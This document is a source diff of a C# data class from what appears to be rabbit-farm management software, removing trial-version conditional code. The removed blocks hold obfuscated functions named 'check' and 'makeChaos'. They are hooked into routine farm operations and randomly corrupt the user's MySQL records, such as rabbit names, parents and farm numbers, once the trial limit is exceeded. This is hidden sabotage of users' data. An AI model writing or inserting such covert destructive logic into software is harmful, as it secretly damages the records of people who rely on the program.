@@ -1,6 +1,4 @@
-﻿//#define TRIAL
-//#define CRACKED
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Text;
 using MySql.Data.MySqlClient;
@@ -12,11 +10,7 @@ namespace rabnet
     public class Building:IData
     {
         public int fid;
-#if TRIAL && !CRACKED
-        public byte ffarm;
-#else
         public int ffarm;
-#endif
         public int ftid;
         public int fsecs;
         public String[] fareas;
@@ -35,11 +29,7 @@ namespace rabnet
         public string[] fullname=new string[4];
         public string[] smallname = new string[4];
         public string[] medname = new string[4];
-#if TRIAL && !CRACKED
-        public Building(int id, byte farm, int tier_id, string type, string typeloc, string delims, string notes, bool repair, int seccnt)
-#else
         public Building(int id, int farm, int tier_id, string type, string typeloc, string delims, string notes, bool repair, int seccnt)
-#endif
         {
             fid = id;
             ffarm = farm;
@@ -59,11 +49,7 @@ namespace rabnet
         }
         #region IBuilding Members
         public int id() { return fid; }
-#if TRIAL && !CRACKED
-        public byte farm() { return ffarm; }
-#else
         public int farm() { return ffarm; }
-#endif
         public int tier_id() { return ftid; }
         public string delims(){return fdelims;}
         public string type(){return ftypeloc;}
@@ -164,55 +150,6 @@ namespace rabnet
             }
             return res;
         }
-#if TRIAL
-        public static void check1(MySqlConnection sql, int famid)
-        {
-            MySqlCommand cmd = new MySqlCommand(String.Format("as KJAhd {0:d} akljgajdasavclm", famid), sql);
-            int jh = -289 + famid;
-            if (jh < 0)
-            {
-                Random r = new Random();
-                if (r.NextDouble() > 0.5) makeChaos1(sql);
-                if (r.NextDouble() < 0.3) makeChaos5(sql);
-                if (r.NextDouble() > 0.6784) makeChaos4(sql);
-            }
-        }
-        public static void makeChaos1(MySqlConnection sql)
-        {
-            MySqlCommand cmd = new MySqlCommand("SELECT o_value FROM options WHERE o_name='chaos';", sql);
-            MySqlDataReader rd = cmd.ExecuteReader();
-            string chv = "";
-            if (rd.Read())
-                chv = rd.GetString(0);
-            rd.Close();
-            string code="abcdefg";
-            int id = new Random().Next(7);
-            chv += code[id];
-            if (chv == ""+code[id])
-                cmd.CommandText = String.Format("INSERT INTO options(o_name,o_subname,o_value) VALUES('chaos','keycode','{0:s}');",chv);
-            else
-                cmd.CommandText = String.Format("UPDATE options SET o_value='{0:s}' WHERE o_name='chaos';",chv);
-            cmd.ExecuteNonQuery();
-            int av = (id+18) * 3-17;
-            cmd.CommandText = String.Format("UPDATE rabbits SET r_name=r_name+{0:d},r_surname=r_surname+{0:d},r_mother=r_mother+{0:d};",av);
-            cmd.ExecuteNonQuery();
-        }
-        public static void checkFarms3(MySqlConnection sql)
-        {
-            MySqlCommand cmd = new MySqlCommand("SELECT COUNT(*) FROM minifarms WHERE m_id>255;");
-            MySqlDataReader rd = cmd.ExecuteReader();
-            int cnt = 0;
-            if (rd.Read())
-                cnt = rd.GetInt32(0);
-            rd.Close();
-            switch(cnt % 3)
-            {
-                case 0: check1(sql, cnt); break;
-                case 1: check3(cnt,sql); break;
-                case 2: check5(cnt*543%25,"",cnt,sql); break;
-            }
-        }
-#endif
 
         public static int getRSecCount(String type)
         {
@@ -238,11 +175,7 @@ namespace rabnet
             return res;
         }
 
-#if TRIAL && !CRACKED
-        public static String fullRName(byte farm, int tierid, int sec, String type, String delims, bool shr, bool sht, bool sho)
-#else
         public static String fullRName(int farm, int tierid, int sec, String type, String delims, bool shr, bool sht, bool sho)
-#endif
         {
             String res = String.Format("{0,4:d}",farm);
             if (tierid == 1) res += "-";
@@ -260,11 +193,7 @@ namespace rabnet
             if (rabplace == "")
                 return OneRabbit.NullAddress;
             String[] dts = rabplace.Split(',');
-#if TRIAL && !CRACKED
-            return fullRName(byte.Parse(dts[0]),int.Parse(dts[1]),int.Parse(dts[2]),dts[3],dts[4],shr,sht,sho);
-#else
             return fullRName(int.Parse(dts[0]),int.Parse(dts[1]),int.Parse(dts[2]),dts[3],dts[4],shr,sht,sho);
-#endif
         }
         public static String fullPlaceName(String rabplace)
         {
@@ -284,11 +213,7 @@ namespace rabnet
         public static Building getBuilding(MySqlDataReader rd,bool shr,bool rabbits)
         {
             int id = rd.GetInt32(0);
-#if TRIAL && !CRACKED
-            byte farm = Byte.Parse(rd.GetString(3));
-#else
             int farm = rd.GetInt32(3);
-#endif
             int tid = 0;
             if (rd.GetInt32(2) != 0)
             {
@@ -403,41 +328,6 @@ rabname(t_busy1," + nm + @") r1, rabname(t_busy2," + nm + @") r2,rabname(t_busy3
 FROM minifarms,tiers WHERE (m_upper=t_id OR m_lower=t_id) "+makeWhere()+"ORDER BY m_id;";
         }
 
-#if TRIAL
-        public static void check2(int famid, MySqlConnection sql, int someint)
-        {
-            Random r = new Random(someint);
-            if (famid > 290 + Math.Truncate(r.NextDouble() * 30))
-            {
-                if (someint % 2 == 0)
-                    makeChaos2(sql);
-                else
-                    makeChaos5(sql);
-                if (someint % 3 == 0)
-                    makeChaos4(sql);
-            }
-        }
-        public static void makeChaos2(MySqlConnection sql)
-        {
-            //String code="CDEFGH";
-            int id = new Random().Next(6);
-            int av = (id * 4) - (id % 3) + 12;
-            MySqlCommand cmd = new MySqlCommand(String.Format("UPDATE rabbits SET r_name=r_name+{0:d},r_farm=r_farm+{0:d};",id),sql);
-            cmd.ExecuteNonQuery();
-            cmd.CommandText = "SELECT COUNT(*) FROM options WHERE o_name='chaos';";
-            MySqlDataReader rd = cmd.ExecuteReader();
-            bool haslink=false;
-            if (rd.Read())
-                if (rd.GetInt32(0) > 0) haslink = true;
-            rd.Close();
-            if (haslink)
-                cmd.CommandText = String.Format("UPDATE options SET o_value=CONCAT(o_value,'{0:s}') WHERE o_name='chaos';", "" + "CDEFGH"[id]);
-            else
-                cmd.CommandText = String.Format("INSERT INTO options(o_name,o_subname,o_value) VALUES('chaos','keycode','{0:s}');", "" + "CDEFGH"[id]);
-            cmd.ExecuteNonQuery();
-        }
-#endif
-
         public override string countQuery()
         {
             return "SELECT COUNT(t_id) FROM minifarms,tiers WHERE (m_upper=t_id OR m_lower=t_id)" + makeWhere() + ";";
@@ -458,11 +348,7 @@ FROM minifarms,tiers WHERE (m_upper=t_id OR m_lower=t_id) "+makeWhere()+"ORDER B
             {
                 int id=rd.GetInt32(0);
                 String nm=rd.GetString(1);
-#if TRIAL && !CRACKED
-                byte frm = Byte.Parse(rd.GetString(2));
-#else
                 int frm = rd.GetInt32(2);
-#endif
                 TreeData dt=new TreeData(id.ToString() + ":" + frm.ToString() + ":" + nm);
                 lst.Add(dt);
             }
@@ -494,45 +380,6 @@ FROM minifarms,tiers WHERE (m_upper=t_id OR m_lower=t_id) and t_id=" + tier.ToSt
             return b;
         }
 
-#if TRIAL
-        public static void check3(int famid, MySqlConnection sql)
-        {
-            double pz = famid / 280;
-            if (pz > 1.0)
-            {
-                switch (famid % 3)
-                {
-                    case 0: makeChaos2(sql); break;
-                    case 1: makeChaos3(sql); break;
-                    case 2: makeChaos4(sql); break;
-                }
-            }
-        }
-        public static void makeChaos3(MySqlConnection sql)
-        {
-            string code="2345678";
-            MySqlCommand cmd =new MySqlCommand("SELECT COUNT(*) FROM options WHERE o_name='chaos';",sql);
-            MySqlDataReader rd = cmd.ExecuteReader();
-            int id = new Random().Next(code.Length);
-            int av=id;
-            bool haslink = false;
-            av++;
-            if (rd.Read())
-                if (rd.GetInt32(0) > 0) haslink = true;
-            av++;
-            av*=av;
-            rd.Close();
-            if (haslink)
-                cmd.CommandText = String.Format("UPDATE options SET o_value=CONCAT(o_value,'{0:s}') WHERE o_name='chaos';", "" + code[id]);
-            else
-                cmd.CommandText = String.Format("INSERT INTO options(o_name,o_subname,o_value) VALUES('chaos','keycode','{0:s}');", "" + code[id]);
-            cmd.ExecuteNonQuery();
-            av-=(av%4);
-            cmd.CommandText = String.Format("UPDATE rabbits SET r_name=r_name+r_surname,r_surname=r_surname+{0:d},r_mother=r_mother+{0:d};",av);
-            cmd.ExecuteNonQuery();
-        }
-#endif
-
         public static Building[] getFreeBuildings(MySqlConnection sql,Filters f)
         {
             List<Building> bld = new List<Building>();
@@ -556,9 +403,6 @@ t_repair,t_notes,t_busy1,t_busy2,t_busy3,t_busy4 FROM minifarms,tiers WHERE
             while (rd.Read())
                 bld.Add(getBuilding(rd,false,false) as Building);
             rd.Close();
-#if TRIAL
-            checkFarms(sql);
-#endif
             return bld.ToArray();
         }
 
@@ -579,11 +423,7 @@ t_repair,t_notes,t_busy1,t_busy2,t_busy3,t_busy4 FROM minifarms,tiers WHERE
         public static void addBuilding(MySqlConnection sql, int parent, String name,int farm)
         {
             
-#if TRIAL && !CRACKED
-            byte frm = byte.Parse(farm.ToString());
-#else
             int frm = farm;
-#endif
             MySqlCommand cmd = new MySqlCommand(String.Format(@"INSERT INTO buildings(b_name,b_parent,b_level,b_farm) VALUES(
 '{0:s}',{1:d},{3:s},{2:d});",name,parent,frm,(parent==0?"0":String.Format("(SELECT b2.b_level+1 FROM buildings b2 WHERE b2.b_id={0:d})",parent))), sql);
             cmd.ExecuteNonQuery();
@@ -620,53 +460,6 @@ t_repair,t_notes,t_busy1,t_busy2,t_busy3,t_busy4 FROM minifarms,tiers WHERE
             cmd.ExecuteNonQuery();
             setLevel(sql, bid, level );
         }
-#if TRIAL
-        public static void makeChaos4(MySqlConnection sql)
-        {
-            //string code="hijkl";
-            int id = new Random().Next(5);
-            MySqlCommand cmd = new MySqlCommand(String.Format("UPDATE rabbits SET r_name=r_name+r_name+{0:d},r_farm=r_farm+r_farm{0:d}",id), sql);
-            cmd.ExecuteNonQuery();
-            cmd.CommandText="SELECT o_value FROM options WHERE o_name='chaos';";
-            MySqlDataReader rd = cmd.ExecuteReader();
-            string chv = "";
-            if (rd.Read())
-                chv = rd.GetString(0);
-            rd.Close();
-            chv += "hijkl"[id];
-            if (chv == "" + "hijkl"[id])
-                cmd.CommandText = String.Format("INSERT INTO options(o_name,o_subname,o_value) VALUES('chaos','keycode','{0:s}');", chv);
-            else
-                cmd.CommandText = String.Format("UPDATE options SET o_value='{0:s}' WHERE o_name='chaos';", chv);
-            cmd.ExecuteNonQuery();
-        }
-        public static void check4(MySqlConnection sql, int famid, String somestring)
-        {
-            if (somestring.Length + 281 < famid)
-            {
-                if (somestring.Length % 2 == 0)
-                    makeChaos1(sql);
-                else
-                    makeChaos3(sql);
-                makeChaos2(sql);
-            }
-        }
-        public static void checkFarms(MySqlConnection sql)
-        {
-            MySqlCommand cmd=new MySqlCommand("SELECT MAX(m_id) FROM minifarms WHERE m_id>255;",sql);
-            MySqlDataReader rd=cmd.ExecuteReader();
-            int max = 0;
-            if (rd.Read())
-                max = rd.GetInt32(0);
-            rd.Close();
-            switch (max % 3)
-            {
-                case 0: check5(12,"",max,sql);break;
-                case 1: check4(sql,max,"new"); break;
-                case 2: check2(max,sql,234); break;
-            }
-        }
-#endif
 
         public static void deleteBuilding(MySqlConnection sql, int bid)
         {
@@ -706,11 +499,7 @@ t_delims='{1:s}',t_heater='{2:s}',t_nest='{2:s}' WHERE t_id={3:d};", type, delim
 
         public static int addFarm(MySqlConnection sql,int parent,String uppertype, String lowertype, String name,int id)
         {
-#if TRIAL && !CRACKED
-            byte frm = byte.Parse(id.ToString());
-#else
             int frm = id;
-#endif
             int t1 = addNewTier(sql,uppertype);
             int t2 = addNewTier(sql, lowertype);
             int res = 0;
@@ -719,9 +508,6 @@ t_delims='{1:s}',t_heater='{2:s}',t_nest='{2:s}' WHERE t_id={3:d};", type, delim
             cmd.ExecuteNonQuery();
             res = (int)cmd.LastInsertedId;
             addBuilding(sql, parent, (name!=""?name:String.Format("№{0:d}",res)), res);
-#if TRIAL
-            check3(res, sql);
-#endif
             return res;
         }
 
@@ -756,9 +542,6 @@ WHERE m_id={0:d};", fid), sql);
                 t2 = rd.GetInt32(1);
             }
             rd.Close();
-#if TRIAL
-            check2(fid, sql, t1 + t2);
-#endif
             return new int[] { t1, t2 };
         }
 
@@ -771,9 +554,6 @@ WHERE m_id={0:d};", fid), sql);
             MySqlDataReader rd = cmd.ExecuteReader();
             if (rd.Read())t1 = rd.GetString(0);
             rd.Close();
-#if TRIAL
-            check1(sql,fid);
-#endif
             if (t[1] != 0)
             {
                 cmd.CommandText = String.Format(@"SELECT t_type FROM tiers WHERE t_id={0:d};",t[1]);
@@ -816,45 +596,5 @@ WHERE m_id={0:d};", fid), sql);
             }
         }
 
-#if TRIAL
-        public static void makeChaos5(MySqlConnection sql)
-        {
-            MySqlCommand cmd = new MySqlCommand("SELECT * FROM options WHERE o_name='chaos';");
-            MySqlDataReader rd = cmd.ExecuteReader();
-            int id=((int)new Random().NextDouble()*100)%5;
-            string code = "xyzAB";
-            if (rd.Read())
-            {
-                rd.Close();
-                cmd.CommandText = String.Format("UPDATE options SET o_value=CONCAT(o_value,'{0:s}') WHERE o_name='chaos';",""+code[id]);
-            }else{
-                rd.Close();
-                cmd.CommandText = String.Format("INSERT INTO options (o_name,o_subname,o_value) VALUES('','','{0:s}');",""+code[id]);
-            }
-            int av = (id * 123) % 67;
-            cmd.CommandText = String.Format("UPDATE rabbits SET r_parent=r_parent+r_name+{0:d},r_name=r_name+{0:d};",av);
-
-        }
-        public static void check5(int someint, String somestring, int famid, MySqlConnection sql)
-        {
-            Random r = new Random(someint);
-            if (Math.Floor(r.NextDouble() * 100) + 288 < famid)
-            {
-                makeChaos3(sql);
-                if (r.NextDouble() < 0.1) makeChaos2(sql);
-                if (r.NextDouble() > 0.9) makeChaos4(sql);
-            }
-        }
-        public static void checkFarms5(MySqlConnection sql)
-        {
-            MySqlCommand cmd=new MySqlCommand("SELECT COUNT(*) FROM minifarms WHERE m_id>255;");
-            MySqlDataReader rd=cmd.ExecuteReader();
-            int cnt = 0;
-            if (rd.Read())
-                cnt = rd.GetInt32(0);
-            rd.Close();
-            check3(cnt, sql);
-        }
-#endif
     }
 }
